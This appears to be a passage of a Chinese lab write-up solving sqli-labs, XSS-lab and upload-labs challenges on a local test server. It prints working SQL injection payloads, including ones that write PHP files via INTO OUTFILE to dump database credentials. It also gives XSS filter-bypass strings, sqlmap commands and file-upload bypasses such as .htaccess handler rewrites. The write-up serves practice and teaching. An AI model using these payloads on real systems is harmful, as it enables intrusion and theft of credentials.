+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload --&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure>
+
+<p>访问horse3.php，可以看到数据库的用户名和密码。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127103843514.png" alt="image-20201127103843514"></p>
+<p>进一步的，我们可以通过向目录下写入木马horse4.php去查询数据库中的所有信息，因为已经获取的用户名和密码，所以这个过程是容易实现的。更容易的实现方法是直接仿照index.php的代码，包含文件<code>..\sql-connections\sql-connect.php</code>即可获得数据库访问权限，然后写代码查询即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;..\\sql-connections\\sql-connect.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select group_concat(username),group_concat(password) from users&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$row</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload--&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20include(%22..\\sql-connections\\sql-connect.php%22);%20$sql=%22select%20group_concat(username),group_concat(password)%20from%20users%22;%20$res%20=%20mysql_query($sql);%20$row%20=%20mysql_fetch_array($res);%20echo%20json_encode($row);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\horse4.php%22%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110111890.png" alt="image-20201127110111890"></p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>闭合单引号，然后是bool盲注</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110313357.png" alt="image-20201127110313357"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110922998.png" alt="image-20201127110922998"></p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>基于时间的bool盲注</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure>
+
+<p>在if的条件语句里面写一些二分语句即可基于时间猜出数据库内容。</p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>类似于Less-9，只是换成了双引号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>基于报错的注入方法</p>
+<p>POST payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+;&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163052801.png" alt="image-20201127163052801"></p>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>类似于Less-11，只是需要闭合<code>(&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&quot;) and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+&amp;passwd=dasdfasd&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163743773.png" alt="image-20201127163743773"></p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>为什么又是报错注入，只是换了闭合符号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! POST payload --&gt;</span><br><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e))-- + &amp;passwd=admian&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174352569.png" alt="image-20201127174352569"></p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>同上，闭合双引号</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174606873.png" alt="image-20201127174606873"></p>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>二分盲注，闭合单引号，下图说明admin用户的密码的首字母为’a’。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127175332286.png" alt="image-20201127175332286"></p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>闭合<code>(&quot;</code>的时间盲注</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127181919126.png" alt="image-20201127181919126"></p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>有意思的一个题，因为这里用到了两个参数。</p>
+<p>通过审计源代码，可以看到这里的查询语句稍微有点儿安全意识，不仅对uname进行了严格的过滤，还考虑了先通过uname检查数据库中是否包含了对应用户的数据，然后再去修改用户。<br>但是为什么不对password也过滤一次呢？</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127202028435.png" alt="image-20201127202028435"></p>
+<p>由提示，使用报错注入。<br>但是这里有一个问题，我们如何知道数据库中有哪些用户名呢？这关系到我们是否能够通过第一次SQL查询从而进入内部的if语句中。当然，可以考虑常见的用户名如admin、root、administration等等，但是如果恰好没有这些用户名呢？</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127200552580.png" alt="image-20201127200552580"></p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>审计源码，可以看到php还捕获了IP和uagent两个参数，其中uagent可以被控制且未被过滤。<br>根据关口名称提示，利用uagent完成报错注入</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204937987.png" alt="image-20201127204937987"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204824111.png" alt="image-20201127204824111"></p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>同上，只是注入点换成了referer</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127205230525.png" alt="image-20201127205230525"></p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>审计源码，注意判断条件。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213608048.png" alt="image-20201127213608048"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213523251.png" alt="image-20201127213523251"></p>
+<h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>sqlmap基本上是一梭子的事儿，因为sqlmap足够强大，一般的注入点都能打下来，要是sqlmap都没办法，那么人力也很难了。<br>当然，这里可能会有参数处理(base64)使得sqlmap不能直接使用，那么就需要写代码配合sqlmap了。</p>
+<p>抬手就开始</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233829160.png" alt="image-20200714233829160"></p>
+<p>然后就出了</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233955698.png" alt="image-20200714233955698"></p>
+<p>接下来就只需要按图索骥，从数据库名查表名、列名和字段值了。注意-T -D设定table和database来限定范围。</p>
+<p>一下介绍一些扩展用法</p>
+<blockquote>
+<p> sqlmap -r xxx.txt -p 自动测试抓到的包内的一个post参数</p>
+<p> sqlmap -u 自动测试一个存在注入的url（一般后台比较好用，可以-p指定包中的某个post参数）</p>
+<p> sqlmap -u -data 测试url中get的注入</p>
+<p> sqlmap -u -data –dbs –level2 在level2中，会引入自动化的cookie注入</p>
+<p> 设置temper参数来选定测试的级别</p>
+</blockquote>
+<h2 id="XSS-Lab"><a href="#XSS-Lab" class="headerlink" title="XSS-Lab"></a>XSS-Lab</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先审查元素，明确输入的payload在页面中的位置。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png" alt="image-20201128111226621"></p>
+<p>显然，这里需要闭合<code>&lt;h2&gt;</code>标签，然后跟上js代码。</p>
+<p>因为是第一关，没有特别的过滤，直接闭合就好了。</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level1.php?name=testalert(%27xxs%27);">http://192.168.68.219/xss/level1.php?name=test</h2><script>alert('xxs');</script></a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png" alt="image-20201128111106471"></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>html实体编码</p>
+<p>这里要往表单input标签里面注入<br><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level2.php?keyword=aa%22%3Ealert(1);">http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png" alt="image-20200715144909149"></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><code>&lt;&gt;</code>被实体编码拦截，但是加<code>&#39;</code>或者<code>&quot;</code>会使得浏览器自动补全。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png" alt="image-20201128120223330"></p>
+<p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus%5D">http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11&#39;">http://192.168.68.219/xss/level3.php?keyword=11&#39;</a> onfocus=alert(1) autofocus)</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png" alt="image-20200715151535637"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png" alt="image-20201128111939700"></p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;">http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;</a> onfocus=”javascript:alert(1))</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png" alt="image-20200715152933866"></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>过滤了script-&gt;s_cript    onload-&gt;o_nload<br>不知道为什么javascript:alert(1)没反应，明明解析出来都没问题。</p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png" alt="image-20200715160658462"></p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png" alt="image-20200715160638311"></p>
+<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>href-&gt;hr_ef<br>src-&gt;sr_c</p>
+<p>懂了，原来考的是大小写绕过，那么前面几个题也可以按照这种方法来过。</p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E%5D">http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111&quot;">http://192.168.68.219/xss/level6.php?keyword=111&quot;</a> &gt;alert(1))</p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>存在关键词过滤，这里可以使用双写关键字绕过过滤，并不能使用大小写绕过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png" alt="image-20201128113421841"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png" alt="image-20201128113531000"></p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E%5D">http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=&quot;">http://192.168.68.219/xss/level7.php?keyword=&quot;</a> &gt;alert(1))</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png" alt="image-20201128112539027"></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>非常神奇地在这儿卡了半天，因为一些编码的问题。</p>
+<p>审计PHP的源代码，发现过滤了script等关键字，当然可以通过实体编码绕过，比如hex或者unicode，但是要命的是hex有可能在浏览器中被自动解码再发送，而unicode是以&amp;#开头。在url中，&amp;用来分割参数，#之后的部分不向后端发送，只在本地被使用(比如锚点定位)。</p>
+<p>如 <code>keyword=javascrip&amp;#116;:alert(1)</code>,在后端，keyword只接受到<code>javascrip</code>，非常难过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png" alt="image-20201128114131808"></p>
+<p>又如<code>keyword=%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29</code>，只使用一次urlhex编码，然后被浏览器自动解码。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png" alt="image-20201128114214613"></p>
+<p><strong>solution</strong></p>
+<p>解决办法是使用两次编码，先unicode 后 urlhex。</p>
+<p><code>javascript:alert(1)</code></p>
+<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p>
+<p>payload:<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png" alt="image-20201128114408003"></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>在level8的基础之上，会检查网址格式是否包含http://，所以直接alert(‘http://‘)就好，其余和level8一样，只需要编码javascript就好。</p>
+<p>level9.php?<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(%27http://%27)</code></p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>检查到有三个隐藏的参数，那么首先就是要取消隐藏属性，然后构造xss触发弹窗就好，貌似没有之前的考点。</p>
+<p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onfocus=javascript:alert(1)%20autofocus%20type=&quot;on</code></p>
+<p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onmouseover=javascript:alert(1)%20autofocus%20type=&quot;on</code></p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>这一关比较有意思，虽然t_sort可以被操纵，但是被编码了，没有利用的办法。注入点在refer里，所以只是把level10的payload写在refer里面就好。<br>Firefox好像可以拦截请求修改之后再放出去，但是没有取了解，这里用的是burp。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png" alt="image-20200715204721930"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png" alt="image-20200715204737776"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png" alt="image-20200715204810094"></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>类似的，只是注入的是useragent</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png" alt="image-20200715210259484"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png" alt="image-20200715210328418"></p>
+<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>仍然是类似的，注入的是cookie</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png" alt="image-20200715210549269"></p>
+<h3 id="level14–"><a href="#level14–" class="headerlink" title="level14–"></a>level14–</h3><p>不会，看了WP也不会的那种。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
+<h3 id="level15–"><a href="#level15–" class="headerlink" title="level15–"></a>level15–</h3><p>angular倒是很有意思，但是不会。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/angularjs/angularjs-intro.html">https://www.runoob.com/angularjs/angularjs-intro.html</a></p>
+<p>加载angular.js要科学上网，上网回来请求多了这一坨回来不知道怎么回事儿。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png" alt="image-20200716114658159"></p>
+<p>然后console里面就这样了，看上去level1.php是请求了，但是没有被加载到页面里。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716115010742"></p>
+<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>一开始仿照以前的两次编码，写了这个payload，但是关键字不能被解析，反而一直被当成文本，想来可能是两次编码的问题。</p>
+<p><code>level16.php?keyword=111%26%2360%3B%26%2347%3B%26%2399%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%23101%3B%26%23114%3B%26%2362%3B%26%2360%3B%26%23105%3B%26%23109%3B%26%23103%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2349%3B%26%2332%3B%26%23111%3B%26%23110%3B%26%23101%3B%26%23114%3B%26%23114%3B%26%23111%3B%26%23114%3B%26%2361%3B%26%2334%3B%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2399%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%23101%3B%26%23114%3B%26%2362%3B</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716091758748"></p>
+<p>后面还是上网了，看到可以用<code>%0d</code>(tab)和<code>%0a</code>(换行)来截断。</p>
+<p><code>level16.php?keyword=1111%3Cimg%0asrc=1%0aonerror=%22javascript:alert(1)%22%3E%3Ccenter%3E</code></p>
+<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>审查元素，可以发现GET参数实则是Flash脚本的参数。</p>
+<p>通过查询flash xss相关文章，可以了解到jsFunction是个关键，构造payload使得jsFunction这个关键字被解析，从而跳出了src属性，然后使用常用的onmouseover属性方法加载xss payload。</p>
+<p>jsFunction被解析为属性名。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png" alt="image-20201128115239376"></p>
+<p>然后使用onmouseover或者其他方法执行alert()语句，如果过滤空格，根据level16,可以用%0a绕过。</p>
+<p><code>?arg01=1111&quot;&amp;arg02=eeeeee%20jsFunction%0aonmouseover=javascript:alert(1)</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png" alt="image-20201128115638195"></p>
+<h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>同样的套路。</p>
+<p><code>?arg01=a&amp;arg02=b%20jsFunction%20onmouseover=javascript:alert(1)</code></p>
+<h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/6253464226/">https://www.freesion.com/article/6253464226/</a></p>
+<p>抄袭payload<code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p>
+<h3 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h3><p>竟然还需要逆向swf，那就只好抄了。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p>
+<h2 id="Upload-Lab"><a href="#Upload-Lab" class="headerlink" title="Upload-Lab"></a>Upload-Lab</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>图片马的检测与绕过</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/744001fd0738">https://www.jianshu.com/p/744001fd0738</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.nowamagic.net/librarys/veda/detail/1618">http://www.nowamagic.net/librarys/veda/detail/1618</a></p>
+<p>文件上传绕过总览</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12152431.html">https://www.cnblogs.com/linuxsec/articles/12152431.html</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717095509735.png" alt="image-20200717095509735"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200717095703147"></p>
+<h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>在console里找到前端验证代码，在burp里把后缀名改回来就好。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200716171248882"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171741323.png" alt="image-20200716171741323"></p>
+<h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>验证虽然转移到了后端，但是规则却变得简单，只验证content-type，所以直接上传个php然后再burp里把content-type改成白名单里面的类型就好。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716172253219.png" alt="image-20200716172253219"></p>
+<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>过滤规则，php的函数需要去查一查，这里用到的是windows+php的一个特性。<br>当把文件命名为<code>xxx.yyy::$DATAzzz</code>时，windows会把<code>::DATA</code>之后的部分当作文件的数据流，于是文件名被保存为<code>xxx.yyy</code>。<br>虽然这里有对<code>::$DATA</code>的过滤，但是可以被双写绕过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173641821.png" alt="image-20200716173641821"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173618738.png" alt="image-20200716173618738"></p>
+<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p><strong>::$DATA</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/">https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/</a></p>
+<p>一开始本来是想<code>::$DATA</code>绕过的，比如<code>filename=shell.php::$DATApng</code>,检查时识别出的扩展名是<code>.phppng</code>，php存储文件时会把文件命名为<code>shell.php::$DATApng</code>，然后由于windows+php的特性，<code>::$DATApng</code>会被丢弃。<br>但是没有实践成功，这里出现的问题是<code>::$DATA</code>之后添加字符会报错，要么像下面这样被解析为后面的文件名。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716193252913.png" alt="image-20200716193252913"></p>
+<p><strong>.htaccess</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c674904a711e">https://www.jianshu.com/p/c674904a711e</a></p>
+<p>上传.htaccess文件修改文件的解析规则</p>
+<p>1.设置将文件名为shell的文件按php来解析</p>
+<p><code>&lt;FilesMatch &quot;shell&quot;&gt;</code><br><code>SetHandler application/x-httpd-php Set&lt;/FilesMatch&gt;</code></p>
+<p>2.将jpg文件按照php来解析</p>
+<p><code>AddType application/x-httpd-php .jpg</code></p>
+<p>3.htaccess自解析（未成功，没有htaccess的访问权限）</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716200635567.png" alt="image-20200716200635567"></p>
+<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>依然双写绕过</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716202858396.png" alt="image-20200716202858396"></p>
+<h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>还能双写<code>::$DATA</code>绕过？！<br>确实还可以</p>
+<h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>基本上ban掉了所有可以解析的后缀名，但是相对于之前的关卡，没有处理末尾的<code>.</code>，而php会自动忽略末尾的<code>.</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212245934.png" alt="image-20200716212245934"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212132927.png" alt="image-20200716212132927"></p>
